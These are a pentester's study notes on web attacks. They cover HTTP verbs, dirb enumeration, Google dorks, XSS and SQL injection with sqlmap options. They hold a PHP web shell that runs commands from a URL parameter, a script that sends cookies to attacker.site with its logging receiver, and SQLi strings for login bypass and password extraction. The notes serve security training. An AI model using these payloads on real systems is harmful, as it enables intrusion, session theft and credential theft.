HTTP Verbs
------------------
------------------
GET
------------------
GET /index.html?course=PTS HTTP/1.1
Host: example.site

POST
------------------
POST /index.php HTTP/1.1
Host: example.site

username=john&password=doe

HEAD
------------------
HEAD /index.php HTTP/1.1
Host: example.site

PUT
------------------
PUT <path to upload on server> HTTP/1.1
Host: example.site

<DATA to PUT>
> https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php
> shell.php
  <?php
  if (isset($_GET['cmd'])
  {
    $cmd = $_GET['cmd'];
    echo '<pre>';
    $result = shell_exec($cmd);
    echo $result;
    echo '</pre>';
  }



DELETE
------------------
DELETE <path to upload on server> HTTP/1.1
Host: example.site

OPTIONS
------------------
OPTIONS / HTTP/1.1
Host: example.site


Directories and Files Enumeration
------------------
------------------
common file extentions for backups: .bak .old .txt .xxx

Dirbuster
------------------
https://www.owasp.org/index.php/Category:OWASP_DirBuster_Project

Dirb
------------------
dirb <target url> <path to wordlist>
-a "user agent"
> http://useragentstring.com/pages/useragentstring.php
-p Proxy through Burp
> dirb <target url> -p http://127.0.0.1:8080
-c Cookie
> dirb <target url> -c "COOKIE:XYZ"
-u authentitaction
> dirb <target url> -u "admin:password"
-H header
> dirb <target url> -H "MyHeader: MyContent"
-r no recurse
-z time to wait in milliseconds
-S hide process only show foundings
-X extensions to specify
> dirb <target url> ".php,.bak"
-x path to file with extensions
-o save findings in file


Google Hacking
------------------
site:           hostname
intitle:        title of page
inurl:          URL as source
filetype:       extensions like .pdf
AND, OR, &, |:  locigal operators for search
-:              filter out keywords

http://www.amazon.com/Google-Hacking-Penetration-Testers-Johnny/dp/1597491764/ref=sr_1_1?ie=UTF8&qid=1302083660&sr=8-1
https://developers.google.com/custom-search/docs/xml_results
https://www.exploit-db.com/google-hacking-database


Cross Site Scripting
------------------
<script>alert('XSS');</script>

Reflected XSS:  <URL>/search.php?find=<payload>

Persistent XSS: payload will be stored in website, like an guestbook

Cookie Stealing
<script>(document.cookie)</script>

sending Cookie to Attacker:
<script>
var i = new Image();
i.src = "http://attacker.site/log.php?q="+document.cookie;
</script>

log.php Script:
<?php
$filename="/tmp/log.txt";
$fp=fopen($filename, 'a');
$cookie=$_GET['q'];
fwrite($fp, $cookie);
fclose($fp);
?>

learn XSS:  https://hack.me/
http://www.amazon.com/The-Web-Application-Hackers-Handbook/dp/1118026470
https://www.owasp.org/index.php/Cross-site_Scripting_(XSS)


SQL Injection
------------------
http://www.w3schools.com/sql/sql_intro.asp

Statements:
> SELECT name, description FROM products WHERE id=9;
UNION SELECT:
> <SELECT statement> UNION <other SELECT statement>;
comments in SQL:
> #
> --

Strings for SQLi:
> admin' OR 1=1 -- -
> admin' OR 'a'='a      // two conditions to test with bool

UNION SELECT SQLi:
> SELECT name, description FROM products WHERE id='' UNION SELECT Username, Password FROM Accounts WHERE 'a'='a';

// Thinks to test in web apps:
> GET Parameter
> POST Parameter
> HTTP Headers
  > User-Agent
  > Cookie
  > Accept
  [...]
 
Testing Input:
> ' and ""
> SELECT, UNION, [...]
> Comments
// !!! Allways Test only one injection at a time !!! //

Pentest Szenario:
> look in the URL for parameters to inject, like [...]?id=xxx
> test the ' character in the URL
> usernames and passwors can be testet via adding an ' character into the string

Boolean Based SQLi:
> SELECT Name, Description FROM Products WHERE id='' OR 'a'='a';      // test if input into id is true
> select user();    // name of the user currently using the database
> substring('test', 2, 1);    // substring of the given parameters, the position (2) and the lenght (1)
> select substing(user(), 1, 1) = 'r';      // test, if the first character of user is an r

UNION Based SQLi:
> select description FROM items WHERE id='' UNION SELECT user(); -- -';     // fources the web app to show the user() funcion on the output page
> [...]' UNION SELECT null; null; [...] -- -                                // detect the number of fields
> [...]' UNION SELECT 'string 1', 'string 2', 'string n'; -- -              // test the fields for content
> [...]' UNION SELECT user(), 'string 1',

sqlmap:
> -u <URL>
> -r <file to read>
> -p <parameter>
> -dbs
> --current-db
> --current-user
> --technique=
  > U   UNION Based
  > B   BOOLEAN
  > E   Error-based
  > S   Stacked
  > T   Time-based blind
  > Q   inline Queries
> --method=
  > PUT, POST, GET
> -p <Proxy, this can be Burp on 127.0.0.1:8080>
> --data=<POST string>
> --cookie=
> --user-agent=


https://hack.me/


